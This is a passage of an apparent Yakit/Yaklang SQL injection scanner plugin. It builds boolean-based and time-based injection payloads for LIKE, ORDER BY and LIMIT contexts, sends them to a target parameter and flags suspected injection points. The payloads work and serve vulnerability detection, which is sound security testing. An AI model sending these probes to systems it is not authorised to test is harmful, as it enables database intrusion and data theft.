        risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
        risk.type("sqlinjection"),
        risk.payload(negativePayload),
        risk.parameter(param.Name()),
        risk.request(n1rsp.RequestRaw),
        risk.response(n1rsp.ResponseRaw),
    )
    return true
}

/* Test %') like scenario */
func checkType7(param, originValue, originResponse, IsNumeric){
    var positivePayload, negativePayload, paramType
    defer func {
        err := recover()
        if err != nil {
            yakit_output(err)
        }

    }


    if IsNumeric {
        paramType = "Number"
        rand1 := randn(1, 20000)
        positivePayload = sprintf(`%v%%')/**/AND/**/'%v'='%v'AND'%v%%'=('%v`, originValue, rand1, rand1, originValue, originValue)
        negativePayload = sprintf(`%v%%')/**/AND/**/'%v'='%v'AND'%v%%'=('%v`, originValue, rand1, rand1 + 1, originValue, originValue)
    } else {
        paramType = "String"
        randString := randstr(4)
        positivePayload = sprintf(`%v%%')/**/AND/**/'%v'='%v'AND'%v%%'=('%v`, originValue, randString, randString, originValue, originValue)
        negativePayload = sprintf(`%v%%')/**/AND/**/'%v'='%v'AND'%v%%'=('%v`, originValue, randString, randstr(5), originValue, originValue)
    }


    res = originResponse
    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)

    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf(("request positive rsp error: %s"), err))
        return false
    }


    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)

    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf("response negative rsp error: %v", err))
        return false
    }


    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)

    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
        yakit_output("response empty")
        return false
    }



    opResult := str.CalcSimilarity(bodyOrigin, pBody)

    if opResult < UPPER_RATIO_BOUND {
        REASON = sprintf(
            `The parameter is %v, assuming like single quote boundary, [%v] is different from the original parameter result`,
            paramType,
            positivePayload,
        )
        yakit_output(REASON)
        return false
    }


    pnResult := str.CalcSimilarity(pBody, nBody)

    if pnResult > SIMILARITY_RATIO {
        reason = sprintf(
            "The parameter is %v, injection check Failure: Reason: [%v] and [%v] The results are similar to/Same: Similarity: %v",
            paramType,
            positivePayload,
            negativePayload,
            pnResult,
        )
        yakit_output(reason)
        return false
    }


    yakit_output(sprintf(
        "Suspected SQL injection: [Parameter: %v type [%v] like injection (%%') ))】",
        paramType,
        param.Name(),
    ))
    yakit_output(sprintf(
        "test is: %v The response packet is: %s",
        positivePayload,
        string(pBody),
    ))
    yakit_output(sprintf(
        "The negative payload used in the test is: %v The response packet is: %s",
        negativePayload,
        string(nBody),
    ))

    risk.NewRisk(
        res.Url,
        risk.title(sprintf(
            "Maybe SQL Injection: [param - value: %v single-quote paren like]",
            originValue,
        )),
        risk.titleVerbose(sprintf(
            "suspected SQL injection: [Parameter: %v[%v] like injection (%%') )】",
            paramType,
            param.Name(),
        )),
        risk.ignore(true),
        risk.description("SQL injection is a common security vulnerability, which refers to an attacker inserting malicious SQL code into the input field of an application to bypass the applications validation and filtering mechanisms, perform unauthorized operations on the database, or obtain Sensitive data. This type of vulnerability may lead to serious consequences such as data leakage, data corruption, unauthorized access, denial of service and complete system crash."),
        risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
        risk.type("sqlinjection"),
        risk.payload(negativePayload),
        risk.parameter(param.Name()),
        risk.request(n1rsp.RequestRaw),
        risk.response(n1rsp.ResponseRaw),
    )
    return true
}

/* Test %") like scenario */
func checkType8(param, originValue, originResponse, IsNumeric){
    var positivePayload, negativePayload, paramType
    defer func {
        err := recover()
        if err != nil {
            yakit_output(err)
        }

    }


    if IsNumeric {
        paramType = "Number"
        rand1 := randn(1, 20000)
        positivePayload = sprintf(`%v%%")/**/AND/**/'%v'='%v'AND'%v%%'=("%v`, originValue, rand1, rand1, originValue, originValue)
        negativePayload = sprintf(`%v%%")/**/AND/**/'%v'='%v'AND'%v%%'=("%v`, originValue, rand1, rand1 + 1, originValue, originValue)
    } else {
        paramType = "String"
        randString := randstr(4)
        positivePayload = sprintf(`%v%%")/**/AND/**/'%v'='%v'AND'%v%%'=("%v`, originValue, randString, randString, originValue, originValue)
        negativePayload = sprintf(`%v%%")/**/AND/**/'%v'='%v'AND'%v%%'=("%v`, originValue, randString, randstr(5), originValue, originValue)
    }


    res = originResponse
    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)

    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf(("request positive rsp error: %s"), err))
        return false
    }


    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)

    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf("response negative rsp error: %v", err))
        return false
    }


    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)

    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
        yakit_output("response empty")
        return false
    }



    opResult := str.CalcSimilarity(bodyOrigin, pBody)

    if opResult < UPPER_RATIO_BOUND {
        REASON = sprintf(
            `The parameter is %v, assuming like double quote bracket boundary, [%v] is not the same as the original parameter result`,
            paramType,
            positivePayload,
        )
        yakit_output(REASON)
        return false
    }


    pnResult := str.CalcSimilarity(pBody, nBody)

    if pnResult > SIMILARITY_RATIO {
        reason = sprintf(
            "The parameter is %v, injection check Failure: Reason: [%v] and [%v] The results are similar to/Same: Similarity: %v",
            paramType,
            positivePayload,
            negativePayload,
            pnResult,
        )
        yakit_output(reason)
        return false
    }


    yakit_output(sprintf(
        "Suspected SQL injection: [Parameter: %v type [%v] like injection (\"% ))】",
        paramType,
        param.Name(),
    ))
    yakit_output(sprintf(
        "test is: %v The response packet is: %s",
        positivePayload,
        string(pBody),
    ))
    yakit_output(sprintf(
        "The negative payload used in the test is: %v The response packet is: %s",
        negativePayload,
        string(nBody),
    ))

    risk.NewRisk(
        res.Url,
        risk.title(sprintf(
            "Maybe SQL Injection: [param - type: value:%v double-quote paren like]",
            originValue,
        )),
        risk.titleVerbose(sprintf(
            "Suspected SQL injection: [Parameter: %v[%v] like injection (%%\") )】",
            paramType,
            param.Name(),
        )),
        risk.ignore(true),
        risk.description("SQL injection is a common security vulnerability, which refers to an attacker inserting malicious SQL code into the input field of an application to bypass the applications validation and filtering mechanisms, perform unauthorized operations on the database, or obtain Sensitive data. This type of vulnerability may lead to serious consequences such as data leakage, data corruption, unauthorized access, denial of service and complete system crash."),
        risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
        risk.type("sqlinjection"),
        risk.payload(negativePayload),
        risk.parameter(param.Name()),
        risk.request(n1rsp.RequestRaw),
        risk.response(n1rsp.ResponseRaw),
    )
    return true
}

/* test order by unclosed type */
func checkTypeOrderBy(param, originValue, originResponse, IsNumeric) {
    var positivePayload, negativePayload, paramType
    defer func {
        err := recover()
        if err != nil {
            yakit_output(err)
        }

    }


    if IsNumeric {
        paramType = "Number"
        rand1 = randn(1, 20000)
        positivePayload = "(select/**/1/**/regexp/**/if(1=1,1,0x00))"
        negativePayload = "(select/**/1/**/regexp/**/if(1=2,1,0x00))"
    } else {
        paramType = "String"
        randString := randstr(4)
        positivePayload = "(select/**/1/**/regexp/**/if(1=1,1,0x00))"
        negativePayload = "(select/**/1/**/regexp/**/if(1=2,1,0x00))"
    }


    res = originResponse
    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)

    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf(("request positive rsp error: %s"), err))
        return false
    }


    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)

    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf("response negative rsp error: %v", err))
        return false
    }


    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)

    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
        yakit_output("response empty")
        return false
    }



    opResult := str.CalcSimilarity(bodyOrigin, pBody)

    if opResult < UPPER_RATIO_BOUND {
        REASON = sprintf(
            "parameter is %v. Assuming double quote boundary, [%v] is different from the original parameter result.",
            paramType,
            positivePayload,
        )
        yakit_output(REASON)
        return false
    }


    pnResult := str.CalcSimilarity(pBody, nBody)

    if pnResult > SIMILARITY_RATIO {
        reason = sprintf(
            "parameter is %v, unbounded ORDER BY injection check failed: Reason: [%v] and [%v] results are similar to/Same: Similarity: %v",
            paramType,
            positivePayload,
            negativePayload,
            pnResult,
        )
        yakit_output(reason)
        return false
    }


    yakit_output(sprintf(
        "Suspected SQL injection: [Parameter: %v type [%v] ORDER BY unbounded closed]",
        paramType,
        param.Name(),
    ))
    yakit_output(sprintf(
        "test is: %v The response packet is: %s",
        positivePayload,
        string(pBody),
    ))
    yakit_output(sprintf(
        "The negative payload used in the test is: %v The response packet is: %s",
        negativePayload,
        string(nBody),
    ))

    // risk.NewRisk(
    //     res.Url,
    //     risk.severity("critical"),
    //     risk.title(sprintf("Maybe SQL Injection: [param - type:str value:%v single-quote]", originValue),),
    //     risk.titleVerbose(sprintf("Suspected SQL injection: [Parameter: %v[%v] ORDER BY unbounded closure]",paramType, originValue)),
    //     risk.type("sqlinjection"),
    //     risk.request(n1rsp.RequestRaw),
    //     risk.response(n1rsp.ResponseRaw),
    //     risk.payload(negativePayload),
    //     risk.parameter(param.Name()),
    // )

    confirmPayload = sprintf("IF(1=1,%v,%v)", "sleep(3)", originValue)
    result, err = param.Fuzz(confirmPayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1),
                                                       fuzz.WithTimeOut(30))
    if err != nil {
        return false
    }


    if result.ServerDurationMs > 2500 {
        risk.NewRisk(
            result.Url,
            risk.severity("critical"),
            risk.title(str.f("ORDER BY SQL Injection: [%v:%v]", param.Name(), param.Value())),
            risk.titleVerbose(str.f(
                "Suspected ORDER BY SQL injection: [Parameter name: %v Value: %v]",
                param.Name(),
                param.Value(),
            )),
            risk.description("SQL injection is a common security vulnerability, which refers to an attacker inserting malicious SQL code into the input field of an application to bypass the applications validation and filtering mechanisms, perform unauthorized operations on the database, or obtain Sensitive data. This type of vulnerability may lead to serious consequences such as data leakage, data corruption, unauthorized access, denial of service and complete system crash."),
            risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
            risk.type("sqlinjection"),
            risk.request(result.RequestRaw),
            risk.response(result.ResponseRaw),
            risk.payload(confirmPayload),
            risk.parameter(param.Name()),
        )
        yakit_output(str.f(
            "exists ORDER BY SQL injection: [Parameter name: %v value :%v]",
            param.Name(),
            param.Value(),
        ))
        return true
    }


    return true//exists. Although no direct delay is detected, page changes are still detected. It may be that ORDER BY injection requires manual judgment.
    //exists. Although no direct delay is detected, page changes are still detected. It may be that ORDER BY injection requires manual judgment.
}

// test limit No closed type
func checkLimitNoBound(param, originValue, originResponse, IsNumeric) {
    var positivePayload, negativePayload, paramType
    defer func {
        err := recover()
        if err != nil {
            yakit_output(err)
        }

    }
    if IsNumeric {
        paramType = "Number"
        rand1 := randn(1, 20000)
        positivePayload = sprintf(`(SELECT/**/(CASE/**/WHEN/**/(%v=%v)/**/THEN/**/%v/**/ELSE/**/(SELECT/**/%v/**/UNION/**/SELECT/**/%v)/**/END))`, rand1, rand1, originValue, rand1, rand1+100)
        negativePayload = sprintf(`(SELECT/**/(CASE/**/WHEN/**/(%v=%v)/**/THEN/**/%v/**/ELSE/**/(SELECT/**/%v/**/UNION/**/SELECT/**/%v)/**/END))`, rand1, rand1+1, originValue, rand1, rand1+100)
    } else {
       return false
    }


    res = originResponse
    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)

    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf(("request positive rsp error: %s"), err))
        return false
    }


    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)

    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf("response negative rsp error: %v", err))
        return false
    }


    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)

    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
        yakit_output("response empty")
        return false
    }



    opResult := str.CalcSimilarity(bodyOrigin, pBody)

    if opResult < UPPER_RATIO_BOUND {
        REASON = sprintf(
            `The parameter is %v, assuming like single quote boundary, [%v] is different from the original parameter result`,
            paramType,
            positivePayload,
        )
        yakit_output(REASON)
        return false
    }


    pnResult := str.CalcSimilarity(pBody, nBody)

    if pnResult > SIMILARITY_RATIO {
        reason = sprintf(
            "The parameter is %v, injection check Failure: Reason: [%v] and [%v] The results are similar to/Same: Similarity: %v",
            paramType,
            positivePayload,
            negativePayload,
            pnResult,
        )
        yakit_output(reason)
        return false
    }


    yakit_output(sprintf(
        "Suspected SQL injection: [Parameter: %v type [%v] like injection (\"% ))】",
        paramType,
        param.Name(),
    ))
    yakit_output(sprintf(
        "test is: %v The response packet is: %s",
        positivePayload,
        string(pBody),
    ))
    yakit_output(sprintf(
        "The negative payload used in the test is: %v The response packet is: %s",
        negativePayload,
        string(nBody),
    ))

    risk.NewRisk(
        res.Url,
        risk.title(sprintf(
            "Maybe SQL Injection: [param - type:limit value:%v no bound]",
            originValue,
        )),
        risk.titleVerbose(sprintf(
            "Suspected SQL injection: [Parameter: %v[%v] limit unbounded closure]",
            paramType,
            param.Name(),
        )),
        risk.description("SQL injection is a common security vulnerability, which refers to an attacker inserting malicious SQL code into the input field of an application to bypass the applications validation and filtering mechanisms, perform unauthorized operations on the database, or obtain Sensitive data. This type of vulnerability may lead to serious consequences such as data leakage, data corruption, unauthorized access, denial of service and complete system crash."),
        risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
        risk.type("sqlinjection"),
        risk.payload(negativePayload),
        risk.parameter(param.Name()),
        risk.request(n1rsp.RequestRaw),
        risk.response(n1rsp.ResponseRaw),
        risk.ignore(true),
    )
    return true
}

__test__ = func() {
    log.setLevel("warn")
    yakit_output("Testing...")
    // results, err := yakit.GenerateYakitMITMHooksParams(
    //     "GET",
    //    "https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=abc&fenlei=256&rsv_pq=0xb56eb15a00002cd0&rsv_t=5d1fJl0OhI5MhRLcVCAXV4gr2fE%2FePEw33%2FXsERUh0M9KX6DxaUyt0PWqpRD&rqlang=en&rsv_enter=1&rsv_dl=tb&rsv_sug3=4&rsv_sug1=2&rsv_sug7=101&rsv_sug2=0&rsv_btype=i&prefixsug=abc&rsp=6&inputT=415&rsv_sug4=1346",
    // )
    // results, err := yakit.GenerateYakitMITMHooksParams(
    //     "GET",
    //     "https://0a3500b903ac5b61c0df4597009a0076.web-security-academy.net/filter?category=Gifts",
    // )
    // if err != nil {
    //     yakit_output("Error in generating mitm parameters")
    //     return
    // }


    //isHttps, url, reqRaw, rspRaw, body = results

    //mirrorFilteredHTTPFlow(results...)
    //yakit_output("Finished test!")
}
//__test__()